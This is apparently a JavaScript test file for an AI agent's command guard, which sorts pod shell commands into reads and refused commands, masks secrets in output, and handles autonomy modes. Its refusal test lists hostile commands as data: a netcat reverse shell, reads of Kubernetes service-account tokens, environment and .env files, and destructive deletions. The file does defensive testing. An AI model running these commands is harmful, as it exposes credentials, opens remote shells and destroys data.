import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createApp } from "../src/app.mjs";
import { openStore } from "../src/db.mjs";
import { classify } from "../src/guard.mjs";
import { podReadOnly } from "../src/handoff.mjs";
import { guardTeamTools } from "../src/integrations/coverage.mjs";
import { unaskedWaitNudge, waitingOnOwner } from "../src/owner-reach.mjs";

test("plain reads inside a pod pass: the commands colleague chats were refused for", () => {
  for (const command of [
    "cat /etc/resolv.conf",
    "redis-cli info replication 2>&1 | head -30; redis-cli config get min-replicas-to-write; redis-cli info server | grep -E \"redis_version|valkey|uptime\"",
    "nc -z -w3 10.0.0.5 5038",
    "timeout 4 nslookup app.example.com",
    "curl -s -o /dev/null -m 20 -w '%{http_code}' https://files.pythonhosted.org/",
    "curl -sk -X GET http://localhost:9200/_cluster/health",
    "wget -S -T 15 -O /dev/null https://example.org/",
    "ls /data0 | sort | uniq -c | sort -rn | head -10",
    "df -h; du -sh /data 2>/dev/null; ps aux | grep -v grep | wc -l",
    "find /var/log -name '*.log'",
  ]) assert.equal(podReadOnly(command), true, command);
});

test("anything that writes, runs other code or names a secret is still refused", () => {
  for (const command of [
    "",
    "rm -rf /data",
    "env",
    "env | grep -iE 'SIMOTEL'",
    "printenv",
    "cat /proc/1/environ",
    "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
    "cat /app/.env",
    "cat /app/.e*",
    "grep -r . /etc",
    "redis-cli config get requirepass",
    "redis-cli config get '*'",
    "redis-cli flushall",
    "redis-cli set a info",
    "redis-cli -a hunter2 info",
    "psql -c 'select 1'",
    "curl -X POST http://localhost:9200/_flush",
    "curl -d a=1 http://x/",
    "curl -u elastic:abc http://localhost:9200/",
    "curl -o /tmp/x http://x/",
    "wget http://x/file",
    "echo x > /data/file",
    "cat a >> b",
    "cat $HOME/x",
    "echo $(id)",
    "echo `id`",
    "ls; rm x",
    "ls && sh -c 'rm x'",
    "ls | xargs rm",
    "find / -delete",
    "find / -exec rm {} ;",
    "sort -o /etc/x y",
    "ip route add 1.1.1.1 via 2.2.2.2",
    "ss -K dst 1.1.1.1",
    "nc -l 8080",
    "nc -e /bin/sh 1.1.1.1 80",
    "timeout 4 sh -c 'nc -z a 1'",
    "date -s 2020-01-01",
    "for p in 80 22; do nc -z a $p; done",
    "'rm' x",
    "ls 'unterminated",
  ]) assert.equal(podReadOnly(command), false, command);
});

const asks = { tool: () => ({}), enqueue: async () => ({ answered: false }) };

test("a colleague chain runs a pod read with its output masked, and refuses a pod write with the way to read", async () => {
  const ran = [];
  const tools = { kube_exec: { execute: async (args) => { ran.push(args.command); return { content: [{ type: "text", text: JSON.stringify({ output: "DB_PASSWORD=hunter2hunter2 ok\nREDIS_TOKEN: hunter3hunter3\npassword=hunter4hunter4" }) }] }; } } };
  const guarded = guardTeamTools(tools, { chatId: "c", asks, verdictOf: classify }).kube_exec;
  const base = { cluster: "prod", namespace: "n", pod: "p" };

  const read = await guarded.execute({ ...base, command: "cat /etc/app.conf" });
  assert.deepEqual(ran, ["cat /etc/app.conf"]);
  assert.doesNotMatch(JSON.stringify(read), /hunter[234]/);
  assert.match(JSON.stringify(read), /ok/);

  const write = await guarded.execute({ ...base, command: "touch /data/x" });
  assert.equal(write.isError, true);
  assert.deepEqual(ran, ["cat /etc/app.conf"]);
  assert.match(write.content[0].text, /request_full_access/);
  assert.match(write.content[0].text, /خواندن ساده داخل پاد آزاد است/);
});

function appWithChat() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "griffin-autonomy-"));
  const store = openStore(path.join(dir, "db.sqlite"));
  const sent = [];
  const runner = { isActive: () => false, activeCount: () => 0, send: async (id, msg) => { sent.push({ id, ...msg }); return { delivered: "run" }; } };
  const chat = store.createChat({ title: "همکار", caller: "team" });
  store.updateChat(chat.id, { mode: "ask" });
  const app = createApp({ store, runner });
  const setMode = (mode) => app.request(`/api/chats/${chat.id}`, { method: "PATCH", headers: { "content-type": "application/json" }, body: JSON.stringify({ mode }) });
  return { store, chat, sent, setMode };
}

test("«بدون پرسیدن» on the page starts the conversation's next turn, once", async () => {
  const { store, chat, sent, setMode } = appWithChat();
  assert.equal((await setMode("agent")).status, 200);
  assert.equal(sent.length, 1);
  assert.equal(sent[0].id, chat.id);
  assert.equal(sent[0].intent, "queue");
  assert.match(sent[0].text, /بدون پرسیدن/);
  assert.equal(store.getChat(chat.id).mode, "agent");

  await setMode("agent");
  assert.equal(sent.length, 1, "already on it: no second turn");
  await setMode("ask");
  assert.equal(sent.length, 1, "taking it back starts nothing");
});

test("«منتظر شما» in a mother report is recognised and sent back with the way to reach him", () => {
  assert.equal(waitingOnOwner("**منتظر شما:**\n- دسترسی"), "منتظر شما");
  assert.equal(waitingOnOwner("**منتظر تصمیم شما:**"), "منتظر تصمیم شما");
  assert.equal(waitingOnOwner("به خانم X جواب دادم."), null);
  assert.equal(waitingOnOwner("منتظر جواب ایشان هستیم"), null);
  const nudge = unaskedWaitNudge("منتظر شما");
  assert.match(nudge, /ask_owner/);
  assert.match(nudge, /request_full_access/);
});
